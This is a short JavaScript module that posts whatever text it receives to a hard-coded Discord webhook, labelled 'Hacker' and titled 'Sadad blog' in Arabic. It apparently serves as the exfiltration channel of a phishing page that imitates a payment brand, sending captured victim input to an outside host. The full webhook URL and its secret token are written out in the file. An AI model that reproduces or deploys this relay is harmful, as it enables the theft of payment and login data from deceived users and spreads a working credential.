import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1318595626900000808/ytwaYBFZ3AqEr7VIZUNQz2TcAAuIEmCdJJWynfiMT9BUhNUGHu-XKrwpfdwfjce76jnW",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
